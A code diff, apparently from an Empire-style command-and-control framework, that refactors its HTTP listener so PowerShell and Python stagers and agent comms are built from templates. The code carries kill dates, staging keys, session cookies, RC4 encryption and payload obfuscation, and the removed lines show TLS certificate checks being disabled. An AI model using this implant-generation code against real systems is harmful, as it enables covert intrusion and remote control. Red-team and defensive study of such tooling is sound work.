@@ -7,7 +7,6 @@ import logging
 import os
 import random
 import ssl
-import string
 import sys
 import time
 from builtins import object, str
@@ -483,11 +482,12 @@ class Listener(object):
                     return launcher
                 else:
                     return launcherBase
-                # very basic csharp implementation
+
+            # very basic csharp implementation
             if language.startswith("csh"):
                 workingHours = listenerOptions["WorkingHours"]["Value"]
                 killDate = listenerOptions["KillDate"]["Value"]
-                customHeaders = profile.split("|")[2:]
+                customHeaders = profile.split("|")[2:]  # todo: support custom headers
                 delay = listenerOptions["DefaultDelay"]["Value"]
                 jitter = listenerOptions["DefaultJitter"]["Value"]
                 lostLimit = listenerOptions["DefaultLostLimit"]["Value"]
@@ -541,7 +541,6 @@ class Listener(object):
         """
         Generate the stager code needed for communications with this listener.
         """
-
         if not language:
             print(
                 helpers.color(
@@ -552,7 +551,6 @@ class Listener(object):
 
         profile = listenerOptions["DefaultProfile"]["Value"]
         uris = [a.strip("/") for a in profile.split("|")[0].split(",")]
-        launcher = listenerOptions["Launcher"]["Value"]
         stagingKey = listenerOptions["StagingKey"]["Value"]
         workingHours = listenerOptions["WorkingHours"]["Value"]
         killDate = listenerOptions["KillDate"]["Value"]
@@ -564,12 +562,25 @@ class Listener(object):
         stage2 = random.choice(uris)
 
         if language.lower() == "powershell":
+            template_path = [
+                os.path.join(self.mainMenu.installPath, "/data/agent/stagers"),
+                os.path.join(self.mainMenu.installPath, "./data/agent/stagers"),
+            ]
 
-            # read in the stager base
-            with open(
-                "%s/data/agent/stagers/http.ps1" % (self.mainMenu.installPath)
-            ) as f:
-                stager = f.read()
+            eng = templating.TemplateEngine(template_path)
+            template = eng.get_template("http/http.ps1")
+
+            template_options = {
+                "working_hours": workingHours,
+                "kill_date": killDate,
+                "staging_key": stagingKey,
+                "profile": profile,
+                "session_cookie": self.session_cookie,
+                "host": host,
+                "stage_1": stage1,
+                "stage_2": stage2,
+            }
+            stager = template.render(template_options)
 
             # Get the random function name generated at install and patch the stager with the proper function name
             stager = data_util.keyword_obfuscation(stager)
@@ -591,28 +602,8 @@ class Listener(object):
                     '$customHeaders = "";', f'$customHeaders = "{ headers }";'
                 )
 
-            # patch in working hours, if any
-            if workingHours != "":
-                stager = stager.replace("WORKING_HOURS_REPLACE", workingHours)
-
-            # Patch in the killdate, if any
-            if killDate != "":
-                stager = stager.replace("REPLACE_KILLDATE", killDate)
-
-            # patch the server and key information
-            stager = stager.replace("REPLACE_SERVER", host)
-            stager = stager.replace("REPLACE_STAGING_KEY", stagingKey)
-            stager = stager.replace("index.jsp", stage1)
-            stager = stager.replace("index.php", stage2)
-
-            unobfuscated_stager = ""
             stagingKey = stagingKey.encode("UTF-8")
-
-            for line in stager.split("\n"):
-                line = line.strip()
-                # skip commented line
-                if not line.startswith("#"):
-                    unobfuscated_stager += line
+            unobfuscated_stager = listener_util.remove_lines_comments(stager)
 
             if obfuscate:
                 unobfuscated_stager = data_util.obfuscate(
@@ -631,7 +622,6 @@ class Listener(object):
                     RC4IV + stagingKey, unobfuscated_stager.encode("UTF-8")
                 )
             else:
-                # otherwise just return the case-randomized stager
                 return unobfuscated_stager
 
         elif language.lower() == "python":
@@ -639,18 +629,20 @@ class Listener(object):
                 os.path.join(self.mainMenu.installPath, "/data/agent/stagers"),
                 os.path.join(self.mainMenu.installPath, "./data/agent/stagers"),
             ]
+
             eng = templating.TemplateEngine(template_path)
-            template = eng.get_template("http.py")
+            template = eng.get_template("http/http.py")
 
             template_options = {
                 "working_hours": workingHours,
                 "kill_date": killDate,
                 "staging_key": stagingKey,
                 "profile": profile,
+                "session_cookie": self.session_cookie,
+                "host": host,
                 "stage_1": stage1,
                 "stage_2": stage2,
             }
-
             stager = template.render(template_options)
 
             # base64 encode the stager and return it
@@ -711,12 +703,6 @@ class Listener(object):
             # Get the random function name generated at install and patch the stager with the proper function name
             code = data_util.keyword_obfuscation(code)
 
-            # patch in the comms methods
-            commsCode = self.generate_comms(
-                listenerOptions=listenerOptions, language=language
-            )
-            code = code.replace("REPLACE_COMMS", commsCode)
-
             # strip out comments and blank lines
             code = helpers.strip_powershell_comments(code)
 
@@ -751,12 +737,6 @@ class Listener(object):
                 f = open(self.mainMenu.installPath + "/data/agent/agent.py")
             code = f.read()
             f.close()
-
-            # patch in the comms methods
-            commsCode = self.generate_comms(
-                listenerOptions=listenerOptions, language=language
-            )
-            code = code.replace("REPLACE_COMMS", commsCode)
 
             # strip out comments and blank lines
             code = helpers.strip_python_comments(code)
@@ -803,39 +783,41 @@ class Listener(object):
 
         This is so agents can easily be dynamically updated for the new listener.
         """
+        host = listenerOptions["Host"]["Value"]
 
         if language:
             if language.lower() == "powershell":
+                template_path = [
+                    os.path.join(self.mainMenu.installPath, "/data/agent/stagers"),
+                    os.path.join(self.mainMenu.installPath, "./data/agent/stagers"),
+                ]
 
-                updateServers = f"""
-                    $Script:ControlServers = @("{ listenerOptions["Host"]["Value"] }");
-                    $Script:ServerIndex = 0;\n
-                """
+                eng = templating.TemplateEngine(template_path)
+                template = eng.get_template("http/http.ps1")
 
-                if listenerOptions["Host"]["Value"].startswith("https"):
-                    updateServers += "[System.Net.ServicePointManager]::ServerCertificateValidationCallback = {$true};"
+                template_options = {
+                    "session_cookie": self.session_cookie,
+                    "host": host,
+                }
 
-                getTask = listener_util.powershell_get_task(self.session_cookie)
-                sendMessage = listener_util.powershell_send_message()
-
-                return updateServers + getTask + sendMessage
+                comms = template.render(template_options)
+                return comms
 
             elif language.lower() == "python":
-                updateServers = f"server = '{listenerOptions['Host']['Value']}'\n"
+                template_path = [
+                    os.path.join(self.mainMenu.installPath, "/data/agent/stagers"),
+                    os.path.join(self.mainMenu.installPath, "./data/agent/stagers"),
+                ]
+                eng = templating.TemplateEngine(template_path)
+                template = eng.get_template("http/comms.py")
 
-                if listenerOptions["Host"]["Value"].startswith("https"):
-                    updateServers += "hasattr(ssl, '_create_unverified_context') and ssl._create_unverified_context() or None"
+                template_options = {
+                    "session_cookie": self.session_cookie,
+                    "host": host,
+                }
 
-                # Import sockschain code
-                f = open(
-                    self.mainMenu.installPath
-                    + "/data/agent/stagers/common/sockschain.py"
-                )
-                socks_import = f.read()
-                f.close()
-
-                sendMessage = listener_util.python_send_message(self.session_cookie)
-                return socks_import + updateServers + sendMessage
+                comms = template.render(template_options)
+                return comms
 
             else:
                 print(
@@ -863,14 +845,13 @@ class Listener(object):
         log.setLevel(logging.ERROR)
 
         bindIP = listenerOptions["BindIP"]["Value"]
-        host = listenerOptions["Host"]["Value"]
         port = listenerOptions["Port"]["Value"]
         stagingKey = listenerOptions["StagingKey"]["Value"]
-        stagerURI = listenerOptions["StagerURI"]["Value"]
         userAgent = self.options["UserAgent"]["Value"]
         listenerName = self.options["Name"]["Value"]
         proxy = self.options["Proxy"]["Value"]
         proxyCreds = self.options["ProxyCreds"]["Value"]
+        stagerURI = listenerOptions["StagerURI"]["Value"]  # todo: stagerURI not used
 
         self.template_dir = self.mainMenu.installPath + "/data/listeners/templates/"
         app = Flask(__name__, template_folder=self.template_dir)
